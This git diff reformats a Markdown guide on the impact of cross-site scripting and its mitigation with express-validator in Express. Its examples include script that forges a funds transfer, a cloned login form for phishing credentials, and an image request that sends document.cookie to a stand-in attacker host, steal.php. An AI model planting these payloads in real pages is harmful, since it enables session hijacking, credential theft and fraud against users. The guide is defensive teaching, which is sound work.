@@ -544,23 +544,34 @@ app.get('/mutants/:role', function(req, res, next){
 
 * Key-logging: malicious code is using addEventListener is used to send a victim's keystrokes back to the attacker's server.
 
-Impact On User Privacy  
+### Impact On User Privacy  
 
-Stealing sensitive data  
+#### Stealing sensitive data  
 
-Cardholder data or personal identifiable information (bank account number, address, username, etc) is stolen and used to siphon funds or perform unauthorized transactions
-Example
-In this example an XMLHttpRequest is used to transfer funds from the victim to the attacker.
+* Cardholder data or personal identifiable information (bank account number, address, username, etc) is stolen and used to siphon funds or perform unauthorized transactions
+
+##### Example
+
+* In this example an XMLHttpRequest is used to transfer funds from the victim to the attacker.
+
+```
 <script>
   var xhr = new XMLHttpRequest();
   xhr.open('POST',http://youvenoidea.com/transfer',true);xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded'); xhr.send('transfer[from]=5124834860&transfer[to_user_id]=48&transfer[amount]=1000&commit=Transfer');
   </script>
-Stealing credentials  
+```
 
-JavaScript and HTML are used to steal credentials instead of cookies. A targeted website's login page is cloned and it is served to a victim.
-Example
-In this example a cloned login page is used to steal a victims credentials.
-The attacker then can wreak havoc in the victim's social media, bank accounts, etc.
+#### Stealing credentials  
+
+* JavaScript and HTML are used to steal credentials instead of cookies. A targeted website's login page is cloned and it is served to a victim.
+
+##### Example
+
+* In this example a cloned login page is used to steal a victims credentials.
+
+* The attacker then can wreak havoc in the victim's social media, bank accounts, etc.
+
+```
 <div>
   <h3>Security Alert</h3>
   <h4>Your session has expired.</h4>
@@ -570,24 +581,39 @@ The attacker then can wreak havoc in the victim's social media, bank accounts, e
     <input type="submit" value="Logon">
   </form>
 </div>
-Account Hijacking  
+```
 
-A victim's session cookies are stolen, which in turn are used by the attacker to impersonate the victim and access sensitive information from their social media, bank accounts, etc.
-Example
-In this example an attacker targets a forms vulnerable field to inject a malicious image.
+#### Account Hijacking  
+
+* A victim's session cookies are stolen, which in turn are used by the attacker to impersonate the victim and access sensitive information from their social media, bank accounts, etc.
+
+##### Example
+
+* In this example an attacker targets a forms vulnerable field to inject a malicious image.
+
+```
 <script>
 new Image().src = 'http://youvenoidea/steal.php?cookies=' +  encodeURI(document.cookie);
 </script>
-Mitigating XSS  
+```
 
-All user input should be escaped or sanitized.
-express-validator  
+### Mitigating XSS  
 
-The express-validator module simplifies input sanitation.
-Usage
-Install express-validator: npm install express-validator --save
-Import: var validator = require('express-validator')
-Apply after body-parser
+* All user input should be escaped or sanitized.
+
+#### express-validator  
+
+* The express-validator module simplifies input sanitation.
+
+#### Usage
+
+* Install express-validator: npm install express-validator --save
+
+* Import: var validator = require('express-validator')
+
+* Apply after body-parser
+
+```
 //req.body.password = 'a <span>comment</span>';
 //req.body.username = " I'm-gonna-hack-you' ";
 
@@ -605,7 +631,10 @@ app.post('/login', function(request, response){
   else
     res.render('login', {password: req.password, username: req.username});
 });
-Protecting User Password  
+```
+---
+
+# Protecting User Password  
 
 Terminology  
 
